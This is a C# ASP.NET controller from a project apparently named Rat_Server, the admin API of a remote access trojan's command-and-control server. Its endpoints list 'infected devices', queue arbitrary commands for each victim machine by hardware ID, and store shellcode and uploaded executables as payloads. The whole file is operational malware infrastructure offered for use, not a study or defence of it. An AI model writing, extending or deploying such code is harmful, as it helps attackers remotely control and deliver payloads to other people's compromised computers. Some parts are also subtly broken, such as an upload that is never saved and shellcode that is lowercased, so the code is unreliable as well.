using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Org.BouncyCastle.Utilities;
using Rat_Server.Model.DataConverter;
using Rat_Server.Model.Context;
using Rat_Server.Model.DTOs;
using Rat_Server.Model.Entities;
using System.Net;
using Rat_Server.Migrations;

namespace Rat_Server.Controllers
{
    /// <summary>
    /// This controller contains endpoints that perform 
    /// administrative actions on the infected devices.
    /// </summary>
    [Authorize(Policy = "AdminOnly")]
    [Route("api/[controller]")]
    [ApiController]
    public class AdminController : ControllerBase
    {
        private readonly RatDbContext _context;

        public AdminController(RatDbContext context)
        {
            _context = context;
        }

        [HttpGet("GetAllInfectedDevices")]
        public async Task<ActionResult<List<Device>>> GetAllInfectedDevices()
        {
            return Ok(await _context.Devices.ToListAsync());
        }

        [HttpGet("GetCommands/{deviceId}")]
        public async Task<ActionResult<List<Command>>> GetCommands(string deviceId)
        {
            if (await _context.Devices.FirstOrDefaultAsync(d => d.Hwid.ToString().Equals(deviceId)) == null)
            {
                return NotFound("No Device with the corresponding deviceId was found");
            }

            List<DeviceCommandDto> commands = new List<DeviceCommandDto>();
            foreach(Command c in await _context.Commands.Where(q => q.DevicedHwid.ToString().Equals(deviceId)).OrderBy(q => q.DateAdded).ToListAsync())
            {
                commands.Add(new DeviceCommandDto
                {
                    commandId = c.commandId.ToString(),
                    CommandValue = c.CommandValue,
                    Hwid = c.DevicedHwid.ToString()
                });
            }
            
            return Ok(commands);
        }

        [HttpPost("AddShellCode")]
        [ProducesResponseType<ShellCodeDto>(StatusCodes.Status201Created)]
        [ProducesResponseType<ConflictObjectResult>(StatusCodes.Status409Conflict)]
        public async Task<ActionResult<ShellCodeDto>> AddShellCode([FromBody] ShellCodeDto shellCodeDto)
        {
            if(await _context.ShellCodes.CountAsync(b => b.Name == shellCodeDto.Name) > 0)
            {
                return Conflict("ShellCode with the same Name already exists");
            }

            try
            {
                ShellCode shellCode = new ShellCode
                {
                    Name = shellCodeDto.Name,
                    Code = shellCodeDto.Code
                };

                await _context.ShellCodes.AddAsync(shellCode);
                await _context.SaveChangesAsync();

                return Created();
            }
            catch(ArgumentException ex)
            {
                return BadRequest(ex);
            }
        }

        [HttpDelete("DeleteShellCode/{id}")]
        [ProducesResponseType(StatusCodes.Status204NoContent)]
        [ProducesResponseType(StatusCodes.Status404NotFound)]
        public async Task<ActionResult> DeleteShellCode(int id)
        {
            ShellCode? shellCode = await _context.ShellCodes.SingleOrDefaultAsync(s => s.ShellCodeId == id);
            
            if(shellCode == null)
            {
                return NotFound();
            }
            
            _context.ShellCodes.Remove(shellCode);
            await _context.SaveChangesAsync();
            
            return NoContent();
        }

        [HttpGet("GetAllShellCode")]
        [ProducesResponseType(typeof(List<ShellCodeDto>), StatusCodes.Status200OK)]
        public async Task<ActionResult<List<ShellCodeDto>>> GetAllShellCode()
        {
            List<ShellCodeDto> shellCodes = new List<ShellCodeDto>();
            
            foreach(ShellCode shellCodeEntity in await _context.ShellCodes.ToListAsync())
            {
                shellCodes.Add(new ShellCodeDto
                {
                    Name = shellCodeEntity.Name,
                    Code = shellCodeEntity.Code.ToLower()
                });
            }

            return Ok(shellCodes);
        }

        [HttpPost("AddExeFile")]
        [ProducesResponseType(StatusCodes.Status201Created)]
        [ProducesResponseType(StatusCodes.Status400BadRequest)]
        public async Task<ActionResult> AddExeFile(IFormFile exeFile)
        {
            // Open the file stream so we can read the content from it
            Stream fileReadStream = exeFile.OpenReadStream();

            // Create a byte array buffer to store the file content
            byte[] fileContentBuffer = new byte[fileReadStream.Length];

            // Copy the file content to the buffer
            if (await fileReadStream.ReadAsync(fileContentBuffer, 0, fileContentBuffer.Length) != fileReadStream.Length)
            {
                // If unable to read the file content, send back a 400 response
                return BadRequest("Unable to read file");
            }

            // Create the ExeFile entity to add to the database
            ExeFile exeFileEntity = new ExeFile
            {
                Content = fileContentBuffer,
                Name = exeFile.Name
            };

            // Add the Exe File to the database
            await _context.ExeFiles.AddAsync(exeFileEntity);

            // Return 204 No Content to indicate to the client the file was successfully added
            return NoContent();
        }

        [HttpPost("AddCommand")]
        public async Task<ActionResult<DeviceCommandDto>> AddCommand([FromBody] AddCommandDto addCommandDto)
        {
            Device? device = await _context.Devices.FirstOrDefaultAsync(d => d.Hwid.ToString().Equals(addCommandDto.Hwid));

            if (device == null)
            {
                return BadRequest("Device not found");
            }

            Command command = new Command
            {
                Device = device,
                DevicedHwid = device.Hwid,
                CommandValue = addCommandDto.CommandValue,
                DateAdded = DateTime.Now
            };

            await _context.Commands.AddAsync(command);
            await _context.SaveChangesAsync();

            return Ok(new DeviceCommandDto
            {
                Hwid = command.DevicedHwid.ToString(),
                CommandValue = command.CommandValue,
                commandId = command.commandId.ToString(),
            });
        }
    }
}
